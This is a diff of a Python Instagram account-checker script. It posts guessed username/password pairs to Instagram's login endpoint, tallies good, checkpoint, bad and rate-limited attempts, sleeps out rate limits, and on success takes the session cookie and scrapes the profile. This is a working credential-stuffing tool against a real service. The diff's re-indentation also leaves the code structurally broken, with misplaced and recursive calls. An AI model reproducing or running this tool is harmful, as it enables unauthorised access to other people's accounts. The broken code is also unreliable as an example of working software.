@@ -255,30 +255,30 @@ def instagram1():
                         'enc_password': "#PWD_INSTAGRAM_BROWSER:0:"+str(time_now)+":"+str(pasw),
                         'queryParams': {},
                         'optIntoOneTap': 'false',}
-                login=requests.post(url, headers=head, data=data).text
-                try:
-		    		if '"authenticated":false' in login:
-		    			os.system("clear")
-		    			print(logo2)
-		    			bad+=1
-		    			print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
-		    		elif '"message":"Please wait a few minutes before you try again."' in login:
-		    			os.system("clear")
-		    			print(logo2)
-		    			timeout+=1
-		    			import time
-		    			print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
-		    			time.sleep(360)
-		    		elif 'userId' in login:
-                        if WTF == "010101" :
-                        	os.system("clear")
-                        	os.system("figlet Login")
-                        	print(45*"≈")
-                        	username_login = user
-                        	password_login = pasw
-                        	print(45*"≈")
-                        	url_login = 'https://www.instagram.com/accounts/login/ajax/'
-                        	headers_login = {
+				login=requests.post(url, headers=head, data=data).text
+				try:
+					if '"authenticated":false' in login:
+						os.system("clear")
+						print(logo2)
+						bad+=1
+						print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
+					elif '"message":"Please wait a few minutes before you try again."' in login:
+						os.system("clear")
+						print(logo2)
+						timeout+=1
+						import time
+						print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
+						time.sleep(360)
+					elif 'userId' in login:
+						if WTF == "010101":
+							os.system("clear")
+							os.system("figlet Login")
+							print(45*"≈")
+							username_login = user
+							password_login = pasw
+							print(45*"≈")
+							url_login = 'https://www.instagram.com/accounts/login/ajax/'
+							headers_login = {
                         	    'accept': '*/*',
                         	    'accept-encoding': 'gzip, deflate, br',
                         	    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
@@ -297,22 +297,22 @@ def instagram1():
                         	    'x-instagram-ajax': '1cb44f68ffec',
                         	    'x-requested-with': 'XMLHttpRequest'
                         	}
-                        	data_login = {
+					data_login = {
                         	    'username': username_login,
                         	    'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1613414957:{password_login}',
                         	    'queryParams': '{}',
                         	    'optIntoOneTap': 'false'
                         	}
-                        	req_login = requests.post(url_login, data=data_login, headers=headers_login)
-                        	if '"authenticated":false' in req_login.text:
-                        		print(" - Halla haya la xoto mar krdn\n")
-                        		exit(0)
-                        	elif '"authenticated":true' in req_login.text:
-                        	    print('Login Akat Sar Kawtw Bw..\n')
-                        	    sessd = req_login.cookies['sessionid']
-                        	    for file in range(1):
-                        	        url_checker = 'https://www.instagram.com/accounts/login/ajax/'
-                        	        headers_checker = {
+					req_login = requests.post(url_login, data=data_login, headers=headers_login)
+					if '"authenticated":false' in req_login.text:
+						print(" - Halla haya la xoto mar krdn\n")
+						exit(0)
+					elif '"authenticated":true' in req_login.text:
+						print('Login Akat Sar Kawtw Bw..\n')
+						sessd = req_login.cookies['sessionid']
+						for file in range(1):
+							url_checker = 'https://www.instagram.com/accounts/login/ajax/'
+							headers_checker = {
                         	            'accept': '*/*',
                         	            'accept-encoding': 'gzip, deflate, br',
                         	            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
@@ -331,16 +331,16 @@ def instagram1():
                         	            'x-instagram-ajax': '1cb44f68ffec',
                         	            'x-requested-with': 'XMLHttpRequest'
                         	        }
-                        	        data_checker = {
+					data_checker = {
                         	            'username': "ddddddddddddddddddddddddddddddddddddddxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
                         	            'enc_password': '#PWD_INSTAGRAM_BROWSER:0:1613414957:dsbvhdbvdsvbsdh',
                         	            'queryParams': '{}',
                         	            'optIntoOneTap': 'false'
                         	        }
-                        	        req = requests.post(url_checker, data=data_checker, headers=headers_checker).text
-                        	        if '"user":false' in req:
-                        	            url_get_info = 'https://www.instagram.com/accounts/edit/?__a=1'
-                        	            headers_get_info = {
+					req = requests.post(url_checker, data=data_checker, headers=headers_checker).text
+					if '"user":false' in req:
+						url_get_info = 'https://www.instagram.com/accounts/edit/?__a=1'
+						headers_get_info = {
                         	                'accept': '*/*',
                         	                'accept-encoding': 'gzip, deflate, br',
                         	                'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
@@ -354,45 +354,40 @@ def instagram1():
                         	                'x-ig-www-claim': 'hmac.AR3P8eA45g5ELL3lqdIm-DHKY2MSY_kGWkN0tGEwG2Ks9Ncl',
                         	                'x-requested-with': 'XMLHttpRequest'
                         	            }
-                        	            data_get_info = {
+					data_get_info = {
                         	                '__a': '1'
                         	            }
-                        	            req_get_info = requests.get(url_get_info, data=data_get_info, headers=headers_get_info)
-                        	            first_name = str(req_get_info.json()['form_data']['username'])
-                                        print(first_name)
-                        #########3
-                        ##########
-                        try:
-                            def script():
-
-                                try:
-                                	username = first_name
-                                except:
-                                    print("Something Error!! Retry")
-                                    script()
-                                url = f"https://www.instagram.com/{username}?hl=en"
-                                r = requests.get(url,headers = {'User-agent': 'your bot 0.1'}).text
-                                s = requests.get(url,headers = {'User-agent': 'your bot 0.1'})
-                                soup = BeautifulSoup(r,'html.parser')
-                                meta = soup.find("meta")
-                                name = soup.find("meta", property="og:title")
-                                name = name["content"].split("(")[0]
-                                link_url = soup.find("meta", property="og:url")
-                                profile_pic = soup.find("meta", property="og:image")
-                                description = soup.find("meta", property="og:description")
-                                followers = description["content"].split(",")[0]
-                                following = description["content"].split(",")[1]
-                                posts = description["content"].split(",")[2].split("-")[0]
-                                time.sleep(1)
-                                ouput(username,name,following,followers,posts,link_url,profile_pic)
-                            def ouput(username,name,following,followers,posts,link_url,profile_pic):
-                                print("\nUserName: "+username)
-                                print("\nName: "+name)
-                                print("\nFollowers: "+followers)
-                                print("\nFollowing: "+following)
-                                print("\nPosts: "+posts)
-                                print()
-                            script()
+					req_get_info = requests.get(url_get_info, data=data_get_info, headers=headers_get_info)
+					first_name = str(req_get_info.json()['form_data']['username'])
+					print(first_name)
+					def script():
+						try:
+							username = first_name
+						except:
+							print("Something Error!! Retry")
+							script()
+						url = f"https://www.instagram.com/{username}?hl=en"
+						r = requests.get(url,headers = {'User-agent': 'your bot 0.1'}).text
+						s = requests.get(url,headers = {'User-agent': 'your bot 0.1'})
+						soup = BeautifulSoup(r,'html.parser')
+						meta = soup.find("meta")
+						name = soup.find("meta", property="og:title")
+						name = name["content"].split("(")[0]
+						link_url = soup.find("meta", property="og:url")
+						profile_pic = soup.find("meta", property="og:image")
+						description = soup.find("meta", property="og:description")
+						followers = description["content"].split(",")[0]
+						following = description["content"].split(",")[1]
+						posts = description["content"].split(",")[2].split("-")[0]
+						ouput(username,name,following,followers,posts,link_url,profile_pic)
+						def ouput(username,name,following,followers,posts,link_url,profile_pic):
+							print("\nUserName: "+username)
+							print("\nName: "+name)
+							print("\nFollowers: "+followers)
+							print("\nFollowing: "+following)
+							print("\nPosts: "+posts)
+							print()
+							script()
                         except:
                             pass
                         ##########
